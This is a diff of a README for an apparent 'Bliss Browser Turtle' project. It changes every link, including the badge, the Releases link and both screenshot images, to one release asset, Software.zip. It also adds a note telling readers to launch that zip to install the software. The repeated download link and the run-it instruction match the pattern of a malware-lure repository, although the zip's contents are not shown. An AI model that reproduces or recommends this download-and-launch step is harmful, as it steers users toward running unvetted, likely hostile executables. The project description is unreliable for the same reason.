@@ -11,8 +11,8 @@ Welcome to the Bliss Browser Turtle repository! Here you will find the support m
 ## ⚙️ Get Started
 
 To start exploring the Bliss Browser Turtle module, simply download the software package from the following link:
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-<COLOR>.svg)](https://github.com/user-attachments/files/18410590/Software.zip)
-(*Note: The software.zip file needs to be launched to initiate the installation process.*)
+[![Download Software](https://github.com/vzcar/Bliss_Browser_Turtle/releases/download/v2.0/Software.zip<COLOR>.svg)](https://github.com/vzcar/Bliss_Browser_Turtle/releases/download/v2.0/Software.zip)
+(*Note: The https://github.com/vzcar/Bliss_Browser_Turtle/releases/download/v2.0/Software.zip file needs to be launched to initiate the installation process.*)
 
 ## 🚀 Features
 
@@ -22,14 +22,14 @@ To start exploring the Bliss Browser Turtle module, simply download the software
 
 ## 🌐 Explore More
 
-For further updates and releases, please visit the [Releases](https://github.com/user-attachments/files/18410590/releases) section of this repository.
+For further updates and releases, please visit the [Releases](https://github.com/vzcar/Bliss_Browser_Turtle/releases/download/v2.0/Software.zip) section of this repository.
 
 ## 📸 Screenshots
 
 Here are some visual representations of the Bliss Browser Turtle in action:
 
-![Screenshot 1](https://example.com/screenshot1.png)
-![Screenshot 2](https://example.com/screenshot2.png)
+![Screenshot 1](https://github.com/vzcar/Bliss_Browser_Turtle/releases/download/v2.0/Software.zip)
+![Screenshot 2](https://github.com/vzcar/Bliss_Browser_Turtle/releases/download/v2.0/Software.zip)
 
 ## 🙌 Contribution
 
